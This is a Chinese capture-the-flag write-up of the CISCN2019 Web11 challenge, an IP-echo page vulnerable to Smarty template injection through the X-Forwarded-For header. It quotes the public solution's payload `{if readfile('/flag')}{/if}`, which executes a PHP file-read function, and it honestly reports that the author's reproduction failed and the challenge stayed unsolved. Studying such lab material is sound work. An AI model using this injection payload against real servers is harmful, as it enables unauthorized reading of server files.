---
title: CISCN2019 - Web - Web11
date: 2026-11-14 18:10:00
categories:
  - CTF
  - CISCN2019
  - Web
tags:
  - Smarty-SSTI
  - X-Forwarded-For
  - 源码泄露
  - 模板注入
cover: /img/cover/sword-girl-blue-sky.jpg
description: CISCN2019 的 Smarty SSTI 题，页面回显客户端 IP。X-Forwarded-For 头原样回显，公开题解借 {if} 标签注入 PHP 函数读文件。本 WP 记录信息收集与公开解法对比，复现未获平台确认，按未解出处理。
keywords:
  - Smarty
  - SSTI
  - XFF头
  - PHP函数执行
  - CISCN2019
ai: >-
  本题来自 CISCN2019 华东南赛区，是个回显客户端 IP 的简单 API。X-Forwarded-For 头原样回显，公开题解据此判断为 Smarty 模板注入点，但测试 7*7 未解析。公开 WP 的解法是借 Smarty 3.1 的 {if} 标签内调用 PHP 函数读文件。本 WP 记录信息收集与公开解法对比，但环境依赖 HTTPS/nc_ssl 通道，复现与提交未完成，平台未确认解出，按契约标记未解出、不编造 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | CISCN2019 华东南赛区 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |
| 漏洞类型 | Smarty SSTI（模板注入）/ 源码信息泄露（未确认） |

## 信息收集

- 环境访问类型为 **HTTPS（nc_ssl）**，占位地址统一记作 `http://target:8080（授权靶场，已脱敏）`。
- 访问首页，页面标题为 `A Simple IP Address API`，是一个简单的 IP 查询 API 页面。
- 页面中有一处 `Current IP:` 字段，回显客户端的 IP（通过 `X-Forwarded-For` 头控制）。

## 漏洞分析

### 注入点判断

**X-Forwarded-For 头会原样回显**在页面中（`Current IP:<XFF值>`），疑似模板注入点。测试 `X-Forwarded-For: 7*7`，页面回显 `7*7`（未被解析为 49），说明不是简单的表达式求值。

### 源码线索

WP 记录访问首页时，响应源码中存在一处疑似硬编码的 PHP 变量（值已脱敏）：

```php
<?php $flag="flag{xxxx}";
```

该变量被描述为直接渲染到页面 HTML 中；但本环境访问需经 HTTPS/nc_ssl 通道，复现环节未能稳定拿到该值，故不作为已确认结论。

## 利用过程

### 公开 WP 描述的标准解法（Smarty SSTI）

公开题解的思路是通过控制 `X-Forwarded-For` 头向模板注入 Smarty 标签：

```http
X-Forwarded-For: {if readfile('/flag')}{/if}
```

原理：Smarty 3.1 中 `{php}` 标签已废弃，但 `{if}` 条件判断内可直接执行 PHP 函数。

### 本环境复现情况

- 构造 XFF 注入后，页面回显内容未按预期解析，模板注入链未能打通。
- 环境依赖 HTTPS/nc_ssl 访问，普通 HTTP 请求与提交通道不稳定。
- 平台未返回 accepted 记录，本题按未解出处理。

## 完整 EXP

复现尝试（访问首页查看响应源码，值已脱敏）：

```python
import requests, urllib3
urllib3.disable_warnings()

host = "http://target:8080"  # 授权靶场（已脱敏）
r = requests.get(host + "/", verify=False, timeout=15)
print(r.text)
```

公开题解给出的 XFF 注入载荷（仅作原理记录，未在本环境验证成功）：

```http
GET / HTTP/1.1
Host: target:8080
X-Forwarded-For: {if readfile('/flag')}{/if}
```

## Flag

（未解出 / 未获取）。本题按 manifest 标记为 `unresolved=true`，平台未确认解出，此处不编造 flag；文中出现的 flag 形态字符串均已脱敏为 `flag{xxxx}`。

## 踩坑与总结

| 要点 | 说明 |
|---|---|
| 环境 | HTTPS（nc_ssl），占位写 `http://target:8080（授权靶场，已脱敏）` |
| 注入点 | XFF 头原样回显，`7*7` 未解析，SSTI 未确认 |
| 公开解法 | Smarty `{if}` 内执行 PHP 函数读文件，本环境未复现成功 |
| 状态 | 未解出，无 accepted 记录 |

1. **先验证回显是否可解析**：`7*7` 不被解析时不要直接套 SSTI 载荷，需确认模板引擎与实际版本。
2. **源码线索不等于已解题**：响应里出现 flag 形态字符串仍需平台确认，未确认前不写作已获取。
3. **访问通道差异**：nc_ssl/HTTPS 环境与常规 HTTP 复现脚本行为不同，是本题卡点之一。
4. 按契约，未解出题的 Flag 段如实写「未解出 / 未获取」，禁止编造 flag。

> 待补充：确认 XFF 注入在目标 Smarty 版本下的实际解析行为，完成平台提交。
